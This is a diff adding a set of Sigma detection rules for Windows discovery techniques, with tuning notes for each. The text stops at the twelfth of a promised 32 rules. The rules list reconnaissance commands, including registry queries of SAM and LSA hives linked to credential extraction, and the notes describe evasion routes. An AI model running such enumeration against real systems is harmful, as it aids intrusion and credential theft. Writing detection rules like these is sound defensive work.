@@ -1,0 +1,2740 @@
+==========================================================================================
+NEW SPRINT SIGMA DETECTION RULES — WRITTEN TODAY (32 rules)
+==========================================================================================
+
+==========================================================================================
+FILE: discovery/AN2076-T1007-DET0933.md
+RULE TITLE: System Service Enumeration (AN2076)
+==========================================================================================
+
+### 1. Technique Breakdown: T1007
+
+* What it is: System Service Discovery. Adversaries may try to get information about registered local system services.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: System Service Enumeration
+Detects command-line utilities enumerating installed services on a Windows system.
+
+```yaml
+title: System Service Enumeration (AN2076)
+id: cdef9001-a189-4db8-bb9a-7c9802cf0040
+status: experimental
+description: Detects the execution of sc.exe or net.exe to enumerate system services. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_images:
+        Image|endswith:
+            - '\sc.exe'
+            - '\net.exe'
+            - '\net1.exe'
+    selection_ofn:
+        OriginalFileName:
+            - 'sc.exe'
+            - 'net.exe'
+            - 'net1.exe'
+    selection_cli:
+        CommandLine|contains:
+            - ' query'
+    condition: (selection_images or selection_ofn) and selection_cli
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - IT administrators querying service status during troubleshooting.
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1007
+    - analytic.an2076
+    - detection.det0933
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Automated Health Checks
+  * The Issue: Monitoring agents frequently query service status.
+  * The Fix: Add a `filter_agents` block to whitelist the parent processes of known monitoring agents (e.g. `monitoringhost.exe`).
+* Problem 2: API Evasion
+  * The Issue: If the attacker uses direct Win32 API calls (e.g. `EnumServicesStatusEx`) via a custom executable, this process creation rule will miss it.
+  * The Fix: Requires API hooking or advanced EDR telemetry for Win32 API monitoring.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2077-T1012-DET0934.md
+RULE TITLE: Registry Query for Sensitive Configurations (AN2077)
+==========================================================================================
+
+### 1. Technique Breakdown: T1012
+
+* What it is: Query Registry. Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Registry Query for Sensitive Configurations
+Detects the use of reg.exe to query sensitive registry hives often targeted for privilege escalation or credential extraction.
+
+```yaml
+title: Registry Query for Sensitive Configurations (AN2077)
+id: f023d881-819a-44f2-9ca0-80ef522f0041
+status: experimental
+description: Detects command-line queries of the Windows Registry for LSA providers, Autoruns, or SAM information. Covers renamed reg.exe via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_image:
+        Image|endswith:
+            - '\reg.exe'
+    selection_ofn:
+        OriginalFileName: 'reg.exe'
+    selection_action:
+        CommandLine|contains:
+            - ' query '
+    selection_hives:
+        CommandLine|contains:
+            - 'LSA'
+            - 'SecurityProviders'
+            - 'CurrentVersion\Run'
+            - 'SAM\Domains'
+    condition: (selection_image or selection_ofn) and selection_action and selection_hives
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Administrative scripts verifying security configurations or startup items.
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1012
+    - analytic.an2077
+    - detection.det0934
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: PowerShell Equivalents
+  * The Issue: Attackers using `Get-ItemProperty` in PowerShell will bypass the `reg.exe` check.
+  * The Fix: Rely on PowerShell Script Block Logging (Event ID 4104) rules for equivalent registry paths.
+* Problem 2: EDR Telemetry Gaps
+  * The Issue: If process command-line logging is disabled or truncated, the specific hive queried may be lost.
+  * The Fix: Ensure full command-line auditing is enabled via GPO (Event ID 4688).
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2078-T1016-DET0935.md
+RULE TITLE: System Network Configuration Enumeration (AN2078)
+==========================================================================================
+
+### 1. Technique Breakdown: T1016
+
+* What it is: System Network Configuration Discovery. Adversaries may look for details about the network configuration and settings.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: System Network Configuration Enumeration
+Detects a barrage of standard command-line tools used to extract network configuration details.
+
+```yaml
+title: System Network Configuration Enumeration (AN2078)
+id: cbdf2001-a189-4db8-bb9a-7c9802cf0042
+status: experimental
+description: Detects execution of ipconfig, arp, route, or nbtstat to gather network interface and routing information. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_images:
+        Image|endswith:
+            - '\ipconfig.exe'
+            - '\arp.exe'
+            - '\route.exe'
+            - '\nbtstat.exe'
+    selection_ofn:
+        OriginalFileName:
+            - 'ipconfig.exe'
+            - 'arp.exe'
+            - 'ROUTE.EXE'
+            - 'nbtstat.exe'
+    selection_cli:
+        CommandLine|contains:
+            - '/all'
+            - '-a'
+            - 'print'
+            - '-n'
+    condition: (selection_images or selection_ofn) and selection_cli
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - IT administrators troubleshooting network connectivity issues.
+level: low
+tags:
+    - attack.discovery
+    - attack.t1016
+    - analytic.an2078
+    - detection.det0935
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: High False Positive Rate
+  * The Issue: `ipconfig /all` is one of the most commonly executed commands by users and helpdesk personnel.
+  * The Fix: This rule is marked `level: low`. It should be used as a building block in a correlation rule (e.g. triggering an alert only if multiple discovery commands run within a 5-minute window).
+* Problem 2: Substring Breadth in CLI Flags
+  * The Issue: Short flags like `-a` and `-n` appear in many unrelated command lines.
+  * The Fix: If promoted past `level: low`, scope CLI flags per-tool using separate `selection_*` blocks per binary rather than a shared OR'd pool.
+* Problem 3: Native API
+  * The Issue: Attackers using `GetAdaptersInfo` API via C++ malware will not spawn these standard utilities.
+  * The Fix: Rely on network-based anomaly detection (NIDS) for unusual internal scanning behavior resulting from the discovery.
+* Problem 4: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2079-T1018-DET0936.md
+RULE TITLE: Remote System Discovery via Native Tools (AN2079)
+==========================================================================================
+
+### 1. Technique Breakdown: T1018
+
+* What it is: Remote System Discovery. Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifiers on a network that may be used for Lateral Movement.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines for Active Directory queries and network viewing are captured.
+  - NIDS (Suricata + Zeek): YES. Active Directory LDAP queries (port 389) or SMB enumeration (port 445) can be observed.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Remote System Discovery via Native Tools
+Detects the use of native Windows utilities to enumerate domain controllers or remote endpoints.
+
+```yaml
+title: Remote System Discovery via Native Tools (AN2079)
+id: f023d881-819a-44f2-9ca0-80ef522f0043
+status: experimental
+description: Detects command-line utilities querying the domain for computer objects or domain controllers. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_images:
+        Image|endswith:
+            - '\nltest.exe'
+            - '\net.exe'
+            - '\net1.exe'
+    selection_ofn:
+        OriginalFileName:
+            - 'nltest.exe'
+            - 'net.exe'
+            - 'net1.exe'
+    selection_cli:
+        CommandLine|contains:
+            - '/dclist:'
+            - '/domain_trusts'
+            - ' view'
+    condition: (selection_images or selection_ofn) and selection_cli
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Domain administrators checking trust relationships or listing available shares.
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1018
+    - analytic.an2079
+    - detection.det0936
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: PowerShell ActiveDirectory Module
+  * The Issue: If the attacker uses `Get-ADComputer` or `Get-ADDomainController`, this process rule will not catch it.
+  * The Fix: Ensure PowerShell module logging is enabled, or monitor LDAP traffic at the network level using Suricata.
+* Problem 2: Evasion via Third-Party Scanners
+  * The Issue: Tools like Advanced IP Scanner or Nmap do not rely on `nltest` or `net view`.
+  * The Fix: Detect the execution of the scanner binaries or the resulting internal port-scanning traffic.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2080-T1046-DET0937.md
+RULE TITLE: Local Network Service Port Discovery (AN2080)
+==========================================================================================
+
+### 1. Technique Breakdown: T1046
+
+* What it is: Network Service Discovery. Adversaries may attempt to get a listing of services listening on remote hosts and local network infrastructure devices.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): YES. Port scanning activity can be directly observed.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - Network logs (Zeek conn.log) for port scan detection are typically handled by standalone NIDS rules rather than Sigma host rules.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Local Network Service Port Discovery
+Detects the use of `netstat` to discover listening ports and associated PIDs on the local system.
+
+```yaml
+title: Local Network Service Port Discovery (AN2080)
+id: cbdf2001-a189-4db8-bb9a-7c9802cf0044
+status: experimental
+description: Detects command-line execution of netstat to enumerate active listening ports and established connections. Covers renamed netstat.exe via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_image:
+        Image|endswith:
+            - '\netstat.exe'
+    selection_ofn:
+        OriginalFileName: 'netstat.exe'
+    selection_cli:
+        CommandLine|contains:
+            - '-an'
+            - '-ano'
+            - '-anbo'
+            - '-na'
+    condition: (selection_image or selection_ofn) and selection_cli
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - System administrators troubleshooting application port conflicts.
+level: low
+tags:
+    - attack.discovery
+    - attack.t1046
+    - analytic.an2080
+    - detection.det0937
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: High False Positive Rate
+  * The Issue: `netstat` is a standard diagnostic tool used daily.
+  * The Fix: This rule is low severity and intended as context for correlation. If `netstat` runs immediately after a Word macro execution, the risk score is elevated in the SIEM.
+* Problem 2: Remote Port Scanning
+  * The Issue: This rule only catches local listening port enumeration. Remote port scanning (e.g. Nmap) bypasses this.
+  * The Fix: Implement NIDS (Suricata) rules to detect high-frequency SYN packets originating from a single host.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2081-T1049-DET0938.md
+RULE TITLE: SMB Share and Session Discovery (AN2081)
+==========================================================================================
+
+### 1. Technique Breakdown: T1049
+
+* What it is: System Network Connections Discovery. Adversaries may attempt to get a listing of network connections to or from the compromised system.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery command execution.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: SMB Share and Session Discovery
+Detects the use of `net.exe` to enumerate active SMB connections or open sessions on a system.
+
+```yaml
+title: SMB Share and Session Discovery (AN2081)
+id: f023d881-819a-44f2-9ca0-80ef522f0045
+status: experimental
+description: Detects command-line execution querying active network sessions or mapped drives. Covers renamed net.exe via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_image:
+        Image|endswith:
+            - '\net.exe'
+            - '\net1.exe'
+    selection_ofn:
+        OriginalFileName:
+            - 'net.exe'
+            - 'net1.exe'
+    selection_cli:
+        CommandLine|contains:
+            - ' use'
+            - ' session'
+    condition: (selection_image or selection_ofn) and selection_cli
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Logon scripts mapping network drives automatically for users.
+level: low
+tags:
+    - attack.discovery
+    - attack.t1049
+    - analytic.an2081
+    - detection.det0938
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Logon Script Noise
+  * The Issue: Enterprise environments use `net use` in standard `logon.bat` scripts.
+  * The Fix: Filter out standard script execution paths (`ParentImage` ending in `\cmd.exe` executing from `\NETLOGON\`) or whitelist specific automated service accounts.
+* Problem 2: Broad ' file' Substring Removed
+  * The Issue: `' file'` was previously included but is too broad — it matches any command line containing that sequence.
+  * The Fix: Removed. Covered adequately by `' use'` and `' session'` which are specific to network connection discovery.
+* Problem 3: Evasion via PowerShell
+  * The Issue: `Get-SmbConnection` or `Get-SmbSession` provides the same data without triggering this rule.
+  * The Fix: Enable PowerShell Script Block logging (Event ID 4104) to catch cmdlet equivalents.
+* Problem 4: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2082-T1069-DET0939.md
+RULE TITLE: Local and Domain Group Discovery (AN2082)
+==========================================================================================
+
+### 1. Technique Breakdown: T1069
+
+* What it is: Permission Groups Discovery. Adversaries may attempt to find local system or domain-level groups and permission settings.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): YES. Domain group queries (LDAP/SAMR) can be detected on the wire.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Local and Domain Group Discovery
+Detects the use of `net.exe` or `dsquery.exe` to enumerate high-value administrative groups.
+
+```yaml
+title: Local and Domain Group Discovery (AN2082)
+id: cbdf2001-a189-4db8-bb9a-7c9802cf0046
+status: experimental
+description: Detects command-line utilities querying local or domain administrative groups. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_images:
+        Image|endswith:
+            - '\net.exe'
+            - '\net1.exe'
+            - '\dsquery.exe'
+    selection_ofn:
+        OriginalFileName:
+            - 'net.exe'
+            - 'net1.exe'
+            - 'dsquery.exe'
+    selection_cli:
+        CommandLine|contains:
+            - ' localgroup'
+            - ' group '
+    selection_targets:
+        CommandLine|contains:
+            - 'administrators'
+            - 'domain admins'
+            - 'enterprise admins'
+    condition: (selection_images or selection_ofn) and selection_cli and selection_targets
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Auditors or identity management software assessing group memberships.
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1069
+    - analytic.an2082
+    - detection.det0939
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: BloodHound / Sharphound
+  * The Issue: Advanced tools use LDAP queries directly rather than shelling out to `net.exe`.
+  * The Fix: Monitor Windows Security Event ID 4661 (SAM object access) or Zeek LDAP logs for high volumes of domain enumeration queries.
+* Problem 2: Unmonitored Custom Groups
+  * The Issue: Organizations with non-standard administrative group names (e.g., `Tier0-Admins`) will not trigger the specific string matches.
+  * The Fix: Expand the `selection_targets` list to include custom internal high-value groups.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2083-T1082-DET0940.md
+RULE TITLE: System and Hardware Information Enumeration (AN2083)
+==========================================================================================
+
+### 1. Technique Breakdown: T1082
+
+* What it is: System Information Discovery. Adversaries may attempt to get detailed information about the operating system and hardware.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: System and Hardware Information Enumeration
+Detects the use of `systeminfo.exe` or `wmic` to gather OS, patch levels, or hardware details.
+
+```yaml
+title: System and Hardware Information Enumeration (AN2083)
+id: f023d881-819a-44f2-9ca0-80ef522f0047
+status: experimental
+description: Detects command-line utilities extracting detailed system, patch, and OS information. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_sysinfo:
+        Image|endswith:
+            - '\systeminfo.exe'
+    selection_sysinfo_ofn:
+        OriginalFileName: 'systeminfo.exe'
+    selection_wmic:
+        Image|endswith:
+            - '\wmic.exe'
+    selection_wmic_ofn:
+        OriginalFileName: 'wmic.exe'
+    selection_wmic_args:
+        CommandLine|contains:
+            - ' qfe '
+            - ' os get '
+            - ' logicaldisk '
+            - ' computersystem '
+    condition: (selection_sysinfo or selection_sysinfo_ofn) or ((selection_wmic or selection_wmic_ofn) and selection_wmic_args)
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - SCCM or other asset management tools collecting hardware inventory.
+level: low
+tags:
+    - attack.discovery
+    - attack.t1082
+    - analytic.an2083
+    - detection.det0940
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: High False Positive Rate from Automation
+  * The Issue: Inventory tools run these commands routinely.
+  * The Fix: Add filters for the parent processes of known inventory agents (e.g. `ccmexec.exe`).
+* Problem 2: Evasion via WMI COM Objects
+  * The Issue: Attackers using PowerShell or C# to query WMI namespaces (`Win32_OperatingSystem`) will bypass `wmic.exe` detection.
+  * The Fix: Enable PowerShell Script Block logging (Event ID 4104) to monitor for `Get-WmiObject` or `Get-CimInstance` calls.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2084-T1083-DET0941.md
+RULE TITLE: Recursive Directory Enumeration (AN2084)
+==========================================================================================
+
+### 1. Technique Breakdown: T1083
+
+* What it is: File and Directory Discovery. Adversaries may enumerate files and directories or search in specific locations for interesting data or credentials.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Recursive Directory Enumeration
+Detects command-line parameters indicating a recursive search or full directory tree listing.
+
+```yaml
+title: Recursive Directory Enumeration (AN2084)
+id: cbdf2001-a189-4db8-bb9a-7c9802cf0048
+status: experimental
+description: Detects command-line operations performing recursive directory listings or searching for files across the entire file system. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_cmd:
+        Image|endswith:
+            - '\cmd.exe'
+    selection_cmd_ofn:
+        OriginalFileName: 'Cmd.Exe'
+    selection_cmd_args:
+        CommandLine|contains:
+            - 'dir /s'
+            - 'tree /F'
+    selection_tree:
+        Image|endswith:
+            - '\tree.com'
+    selection_tree_ofn:
+        OriginalFileName: 'TREE.COM'
+    condition: ((selection_cmd or selection_cmd_ofn) and selection_cmd_args) or selection_tree or selection_tree_ofn
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Developers searching for lost source files or administrators documenting folder structures.
+level: low
+tags:
+    - attack.discovery
+    - attack.t1083
+    - analytic.an2084
+    - detection.det0941
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Shell-less Traversal
+  * The Issue: Ransomware and data-stealers use native Windows APIs (e.g. `FindFirstFile`, `FindNextFile`) to crawl directories without spawning `cmd.exe` or `tree.com`.
+  * The Fix: Monitor for rapid file access patterns using Windows Security Event ID 4663 (File Access) or File System Minifilter drivers (Sysmon Event ID 11).
+* Problem 2: Evasion via PowerShell
+  * The Issue: `Get-ChildItem -Recurse` provides identical functionality and bypasses this rule.
+  * The Fix: Implement corresponding PowerShell script block monitoring (Event ID 4104).
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2085-T1087-DET0942.md
+RULE TITLE: Local and Domain Account Enumeration (AN2085)
+==========================================================================================
+
+### 1. Technique Breakdown: T1087
+
+* What it is: Account Discovery. Adversaries may attempt to get a listing of local or domain accounts.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): YES. LDAP or SAMR queries can be detected on the network.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Local and Domain Account Enumeration
+Detects standard command-line tools used to list users or query account policies.
+
+```yaml
+title: Local and Domain Account Enumeration (AN2085)
+id: f023d881-819a-44f2-9ca0-80ef522f0049
+status: experimental
+description: Detects command-line execution of net user, net accounts, or dsquery user to enumerate accounts. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_images:
+        Image|endswith:
+            - '\net.exe'
+            - '\net1.exe'
+            - '\dsquery.exe'
+    selection_ofn:
+        OriginalFileName:
+            - 'net.exe'
+            - 'net1.exe'
+            - 'dsquery.exe'
+    selection_cli:
+        CommandLine|contains:
+            - ' user '
+            - ' users '
+            - ' accounts '
+    condition: (selection_images or selection_ofn) and selection_cli
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Identity and access management (IAM) tools performing daily account synchronizations.
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1087
+    - analytic.an2085
+    - detection.det0942
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Native Active Directory APIs
+  * The Issue: Attackers using `ADSI` (Active Directory Service Interfaces) via custom VBScript or C# tools will bypass command-line monitoring.
+  * The Fix: Monitor Domain Controller logs for unusual LDAP query patterns or rely on network-based LDAP inspection.
+* Problem 2: Evasion via WMIC
+  * The Issue: `wmic useraccount list` achieves the same goal.
+  * The Fix: Add `wmic.exe` with `useraccount` parameters to the rule, or rely on a generic WMIC monitoring rule.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2086-T1120-DET0943.md
+RULE TITLE: Peripheral Device Discovery via PowerShell or WMI (AN2086)
+==========================================================================================
+
+### 1. Technique Breakdown: T1120
+
+* What it is: Peripheral Device Discovery. Adversaries may attempt to gather information about attached peripheral devices (e.g., USB drives, cameras).
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688 / PowerShell Event ID 4104.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. PowerShell script block contents and process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - PowerShell Event ID 4104 (script_block)
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Peripheral Device Discovery via PowerShell or WMI
+Detects queries for Plug and Play (PnP) entities, often used to enumerate attached USB drives or hardware tokens.
+
+```yaml
+title: Peripheral Device Discovery via PowerShell or WMI (AN2086)
+id: cbdf2001-a189-4db8-bb9a-7c9802cf0050
+status: experimental
+description: Detects command-line execution or PowerShell script blocks querying Win32_PnPEntity to enumerate peripheral devices. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-06-30
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_wmic:
+        Image|endswith:
+            - '\wmic.exe'
+    selection_wmic_ofn:
+        OriginalFileName: 'wmic.exe'
+    selection_wmic_cli:
+        CommandLine|contains:
+            - 'path win32_pnpentity'
+    selection_powershell:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_ps_ofn:
+        OriginalFileName:
+            - 'PowerShell.EXE'
+            - 'pwsh.exe'
+    selection_ps_cli:
+        CommandLine|contains:
+            - 'Get-PnpDevice'
+            - 'Win32_PnPEntity'
+    condition: ((selection_wmic or selection_wmic_ofn) and selection_wmic_cli) or ((selection_powershell or selection_ps_ofn) and selection_ps_cli)
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Device management software or driver update utilities auditing attached hardware.
+level: low
+tags:
+    - attack.discovery
+    - attack.t1120
+    - analytic.an2086
+    - detection.det0943
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Native API Abstraction
+  * The Issue: If the attacker uses C/C++ malware with `SetupDiGetClassDevs` to query devices directly, it will not trigger command-line or script block rules.
+  * The Fix: Requires EDR or API hooking to monitor hardware device enumeration at the Win32 API level.
+* Problem 2: Registry Enumeration
+  * The Issue: Attackers can manually read `HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR` to find historically attached USB devices.
+  * The Fix: Monitor registry access to the `USBSTOR` hive using Sysmon Event ID 12 (Registry Event).
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
+  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2087-T1135-DET0944.md
+RULE TITLE: Network Share Enumeration via Native Tools (AN2087)
+==========================================================================================
+
+### 1. Technique Breakdown: T1135
+
+* What it is: Network Share Discovery. Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather or as a precursor to Lateral Movement.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): YES. SMB traffic enumeration is detectable on the wire.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
